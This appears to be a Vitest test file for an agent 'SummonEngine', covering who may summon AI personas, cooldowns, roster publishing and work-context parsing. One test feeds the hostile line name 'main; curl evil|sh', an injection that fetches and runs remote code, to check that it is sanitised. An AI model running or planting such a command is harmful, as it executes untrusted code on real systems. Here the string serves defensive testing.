import { describe, it, expect, vi, beforeEach } from "vitest";
import { SummonEngine, type SummonHost, type SummonEvent } from "../../../src/agent/summon.js";

const OWNER = "aa".repeat(32);
const SIBLING = "bb".repeat(32);
const STRANGER = "cc".repeat(32);
const SCOUT_PK = "dd".repeat(32);

function makeHost(over: Partial<SummonHost> = {}) {
  const spawned: { persona: string; channels: string[]; work?: unknown }[] = [];
  const published: { kind: number; tags: string[][]; content: string }[] = [];
  const host: SummonHost = {
    ownerPubkey: OWNER,
    personaExists: (n) => ["scout", "vault"].includes(n),
    personaPubkey: async (n) => (n === "scout" ? SCOUT_PK : undefined),
    agentAlive: () => false,
    registryEntry: () => undefined,
    spawn: async (persona, channels, work) => { spawned.push({ persona, channels, work }); },
    restart: async (persona, channels, work) => { spawned.push({ persona, channels, work }); },
    query: async () => [],
    publish: async (t) => { published.push(t); },
    announceTimeout: () => {},
    ...over,
  };
  return { host, spawned, published };
}

const msg = (pubkey: string, content: string, extra: string[][] = []): SummonEvent => ({
  kind: 47103, pubkey, content, tags: [["h", "chan1"], ...extra],
});

describe("SummonEngine — channel messages", () => {
  beforeEach(() => vi.useRealTimers());

  it("owner mention of an existing persona spawns it into the channel", async () => {
    const { host, spawned } = makeHost();
    const engine = new SummonEngine(host);
    await engine.handleEvent(msg(OWNER, "hey @scout look at this"));
    expect(spawned).toEqual([{ persona: "scout", channels: ["chan1"], work: undefined }]);
  });

  it("stranger mentions never summon; attested siblings do", async () => {
    const { host, spawned } = makeHost();
    const engine = new SummonEngine(host);
    await engine.handleEvent(msg(STRANGER, "@scout go"));
    expect(spawned).toHaveLength(0);
    engine.noteAttestation(SIBLING);
    await engine.handleEvent(msg(SIBLING, "@scout go"));
    expect(spawned).toHaveLength(1);
  });

  it("depth >= 5 never summons", async () => {
    const { host, spawned } = makeHost();
    const engine = new SummonEngine(host);
    await engine.handleEvent(msg(OWNER, "@scout go", [["depth", "5"]]));
    expect(spawned).toHaveLength(0);
  });

  it("unknown personas and code-fenced mentions are ignored", async () => {
    const { host, spawned } = makeHost();
    const engine = new SummonEngine(host);
    await engine.handleEvent(msg(OWNER, "@nobody and `@scout` in backticks"));
    expect(spawned).toHaveLength(0);
  });

  it("an agent's own message never summons it (self-summon guard)", async () => {
    const { host, spawned } = makeHost();
    const engine = new SummonEngine(host);
    await engine.handleEvent(msg(SCOUT_PK, "@scout failed to start"));
    expect(spawned).toHaveLength(0);
  });

  it("cooldown suppresses a re-summon inside the window", async () => {
    vi.useFakeTimers();
    // agentAlive stays false (the first spawn 'died'): only the cooldown
    // stands between the two mentions.
    const { host, spawned } = makeHost();
    const engine = new SummonEngine(host, { cooldownMs: 15_000 });
    await engine.handleEvent(msg(OWNER, "@scout go"));
    await engine.handleEvent(msg(OWNER, "@scout go again"));
    expect(spawned).toHaveLength(1);
    await vi.advanceTimersByTimeAsync(16_000);
    await engine.handleEvent(msg(OWNER, "@scout third time"));
    expect(spawned).toHaveLength(2);
    vi.useRealTimers();
  });

  it("a message with no h tag never summons", async () => {
    const { host, spawned } = makeHost();
    const engine = new SummonEngine(host);
    await engine.handleEvent({ kind: 47103, pubkey: OWNER, content: "@scout", tags: [] });
    expect(spawned).toHaveLength(0);
  });
});

describe("SummonEngine — completion paths", () => {
  it("announcement of a pending persona publishes attestation + roster invite", async () => {
    // The roster query must return a real roster for the invite to build on:
    // an empty result reads as a failed query and publishes nothing (see the
    // roster-safety tests below).
    const { host, published, spawned } = makeHost({ query: rosterQuery([["p", OWNER, "owner"]]) });
    const engine = new SummonEngine(host);
    await engine.handleEvent(msg(OWNER, "@scout go"));
    expect(spawned).toHaveLength(1);
    await engine.handleEvent({ kind: 47000, pubkey: SCOUT_PK, content: JSON.stringify({ name: "scout" }), tags: [] });
    const kinds = published.map((p) => p.kind).sort();
    // pre-invite (at spawn) and the announce path both run; both may publish
    // — the assertion is that attestation and roster invite happened at all.
    expect(kinds).toContain(47006);
    expect(kinds).toContain(47102);
  });

  it("doc-comment mentions summon with the same authority rules", async () => {
    const { host, spawned } = makeHost();
    const engine = new SummonEngine(host);
    await engine.handleEvent({ kind: 40101, pubkey: STRANGER, content: "@scout fix this", tags: [["h", "chan1"]] });
    expect(spawned).toHaveLength(0);
    await engine.handleEvent({ kind: 40101, pubkey: OWNER, content: "@scout fix this", tags: [["h", "chan1"]] });
    expect(spawned).toEqual([{ persona: "scout", channels: ["chan1"], work: undefined }]);
  });

  it("gift wrap for a sleeping announced agent summons it with its registry channels", async () => {
    const { host, spawned } = makeHost({ registryEntry: () => ({ channels: ["chanX"] }) });
    const engine = new SummonEngine(host);
    engine.noteAnnouncement(SCOUT_PK, "scout");
    await engine.handleGiftWrapRecipient(SCOUT_PK);
    expect(spawned).toEqual([{ persona: "scout", channels: ["chanX"], work: undefined }]);
  });

  it("gift wrap for an unannounced pubkey does nothing", async () => {
    const { host, spawned } = makeHost();
    const engine = new SummonEngine(host);
    await engine.handleGiftWrapRecipient(STRANGER);
    expect(spawned).toHaveLength(0);
  });

  it("running agent mentioned in a NEW channel restarts with the union", async () => {
    const restarts: unknown[] = [];
    const { host, spawned } = makeHost({
      agentAlive: () => true,
      registryEntry: () => ({ channels: ["chanOld"] }),
      restart: async (persona, channels, work) => { restarts.push({ persona, channels, work }); },
    });
    const engine = new SummonEngine(host);
    await engine.handleEvent(msg(OWNER, "@scout come here"));
    expect(spawned).toHaveLength(0);
    expect(restarts).toEqual([{ persona: "scout", channels: ["chanOld", "chan1"], work: undefined }]);
  });

  it("running agent already serving the channel is left alone", async () => {
    const restarts: unknown[] = [];
    const { host, spawned } = makeHost({
      agentAlive: () => true,
      registryEntry: () => ({ channels: ["chan1"] }),
      restart: async (...a) => { restarts.push(a); },
    });
    const engine = new SummonEngine(host);
    await engine.handleEvent(msg(OWNER, "@scout ping"));
    expect(spawned).toHaveLength(0);
    expect(restarts).toHaveLength(0);
  });

  it("an empty roster query publishes no roster at all", async () => {
    // BrowserWire.query resolves [] whenever no socket is OPEN, so an empty
    // result means the QUERY failed, not that the workspace is empty. A 47102
    // minted from that blip would hold only the new agent and, being newer,
    // replace the real roster — the owner-less wipe publishRoster guards.
    const { host, published } = makeHost();
    const engine = new SummonEngine(host);
    await engine.handleEvent(msg(OWNER, "@scout go"));
    await engine.handleEvent({ kind: 47000, pubkey: SCOUT_PK, content: JSON.stringify({ name: "scout" }), tags: [] });
    expect(published.filter((p) => p.kind === 47102)).toHaveLength(0);
    expect(published.map((p) => p.kind)).toContain(47006); // attestation still lands
  });

  const rosterQuery = (ptags: string[][]) => async (filters: object[]) => {
    const f = filters[0] as { kinds?: number[] };
    if (f.kinds?.includes(47102)) {
      return [{ kind: 47102, pubkey: OWNER, created_at: 100, content: "", tags: [["d", "roster"], ...ptags] } as SummonEvent];
    }
    return [];
  };

  it("the roster invite carries every existing member forward", async () => {
    const { host, published } = makeHost({ query: rosterQuery([["p", OWNER, "owner"], ["p", SIBLING, "member"]]) });
    const engine = new SummonEngine(host);
    await engine.handleEvent(msg(OWNER, "@scout go"));
    await engine.handleEvent({ kind: 47000, pubkey: SCOUT_PK, content: JSON.stringify({ name: "scout" }), tags: [] });
    const roster = published.find((p) => p.kind === 47102)!;
    expect(roster.tags.filter((t) => t[0] === "p").map((t) => t[1])).toEqual([OWNER, SIBLING, SCOUT_PK]);
  });

  it("the owner is restored even when the stored roster lost them", async () => {
    const { host, published } = makeHost({ query: rosterQuery([["p", SIBLING, "member"]]) });
    const engine = new SummonEngine(host);
    await engine.handleEvent(msg(OWNER, "@scout go"));
    await engine.handleEvent({ kind: 47000, pubkey: SCOUT_PK, content: JSON.stringify({ name: "scout" }), tags: [] });
    const roster = published.find((p) => p.kind === 47102)!;
    expect(roster.tags.filter((t) => t[0] === "p").map((t) => t[1])).toContain(OWNER);
  });

  it("work context: repo channel + ⑂ thread root resolve to {repo, line}; hostile strings degrade", async () => {
    const channelEvent = {
      kind: 47101, pubkey: OWNER, created_at: 10, tags: [],
      content: JSON.stringify({ source: "fez-git", meta: { repo: "cool-repo" } }),
    };
    const rootEvent = { kind: 47103, pubkey: OWNER, content: "⑂ `agent/fix-thing`", tags: [] };
    const queryImpl = async (filters: object[]) => {
      const f = filters[0] as { kinds?: number[]; ids?: string[] };
      if (f.kinds?.includes(47101)) return [channelEvent as SummonEvent];
      if (f.ids) return [rootEvent as SummonEvent];
      return [];
    };
    const { host, spawned } = makeHost({ query: queryImpl });
    await new SummonEngine(host).handleEvent(msg(OWNER, "@scout do it", [["e", "rootid", "", "root"]]));
    expect(spawned).toEqual([{ persona: "scout", channels: ["chan1"], work: { repo: "cool-repo", line: "fix-thing" } }]);

    // hostile line name degrades to repo-only — nothing of it reaches spawn
    rootEvent.content = "⑂ `main; curl evil|sh`";
    const { host: h2, spawned: s2 } = makeHost({ query: queryImpl });
    await new SummonEngine(h2).handleEvent(msg(OWNER, "@vault do it", [["e", "rootid", "", "root"]]));
    expect(s2[0]).toEqual({ persona: "vault", channels: ["chan1"], work: { repo: "cool-repo" } });
  });
});
